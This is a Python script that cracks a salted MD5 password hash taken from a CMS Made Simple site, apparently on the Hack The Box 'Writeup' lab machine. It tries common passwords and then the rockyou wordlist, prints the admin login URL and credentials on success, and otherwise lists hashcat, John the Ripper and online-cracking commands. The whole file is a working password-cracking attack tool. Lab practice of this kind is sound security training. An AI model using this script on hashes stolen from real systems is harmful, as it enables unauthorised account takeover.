#!/usr/bin/env python3

import hashlib
import sys

# Extracted credentials
USERNAME = "jkr"
EMAIL = "j23"
HASH = "62def4866937f08cc13bab43bb14e6f7"
SALT = "5a599ef579066807"

print("=" * 60)
print("CMS Made Simple - Password Hash Cracker")
print("=" * 60)
print(f"[+] Username: {USERNAME}")
print(f"[+] Email: {EMAIL}")
print(f"[+] Hash: {HASH}")
print(f"[+] Salt: {SALT}")
print(f"[+] Hash Format: MD5(salt + password)")
print("=" * 60)
print()

# Method 1: Try common passwords
print("[*] Method 1: Testing common passwords...")
print()

common_passwords = [
    "admin", "password", "123456", "admin123", "letmein",
    "qwerty", "administrator", "welcome", "password123",
    "cms", "cms123", "test", "test123", "12345678",
    "root", "admin@123", "cms@123", "htb", "writeup",
    "jkr", "jkr123", "123456789", "abc123", "changeme"
]

found = False
for password in common_passwords:
    # The hash is MD5(salt + password)
    hash_input = (SALT + password).encode()
    computed_hash = hashlib.md5(hash_input).hexdigest()
    
    if computed_hash == HASH:
        print(f"[+++] PASSWORD FOUND: {password}")
        print(f"      Verification: MD5({SALT} + {password}) = {computed_hash}")
        found = True
        break
    else:
        print(f"[-] {password}: {computed_hash}")

if not found:
    print()
    print("[!] Common passwords didn't work. Trying with wordlist...")
    print()

# Method 2: Try with rockyou.txt
if not found:
    try:
        print("[*] Method 2: Using rockyou.txt wordlist...")
        print()
        
        wordlist_path = "/usr/share/wordlists/rockyou.txt"
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
                for line_num, line in enumerate(wordlist, 1):
                    password = line.strip()
                    
                    if not password:
                        continue
                    
                    hash_input = (SALT + password).encode()
                    computed_hash = hashlib.md5(hash_input).hexdigest()
                    
                    if computed_hash == HASH:
                        print(f"[+++] PASSWORD FOUND: {password}")
                        print(f"      Verification: MD5({SALT} + {password}) = {computed_hash}")
                        found = True
                        break
                    
                    if line_num % 100000 == 0:
                        print(f"[*] Tested {line_num} passwords... Current: {password}")
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found at: {wordlist_path}")
            print("[*] Try alternate paths:")
            print("    - /usr/share/wordlists/rockyou.txt")
            print("    - ~/wordlists/rockyou.txt")
            print("    - Download from: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
    
    except Exception as e:
        print(f"[!] Error: {e}")

if found:
    print()
    print("=" * 60)
    print("[✓] SUCCESS!")
    print("=" * 60)
    print(f"[+] Login credentials:")
    print(f"    URL: http://10.129.17.166/writeup/admin/")
    print(f"    Username: {USERNAME}")
    print(f"    Password: {password}")
    print("=" * 60)
else:
    print()
    print("=" * 60)
    print("[!] Password not found in common passwords or rockyou.txt")
    print("=" * 60)
    print()
    print("[*] Try other tools:")
    print()
    print("1. Hashcat:")
    print(f"   hashcat -m 10 \"{HASH}:{SALT}\" /usr/share/wordlists/rockyou.txt")
    print()
    print("2. John the Ripper:")
    print(f"   echo \"{USERNAME}:{HASH}:{SALT}\" > hash.txt")
    print(f"   john hash.txt --format=md5 --wordlist=/usr/share/wordlists/rockyou.txt")
    print()
    print("3. Online cracking:")
    print(f"   Visit: https://crackstation.net/")
    print(f"   Paste hash: {HASH}")
    print()
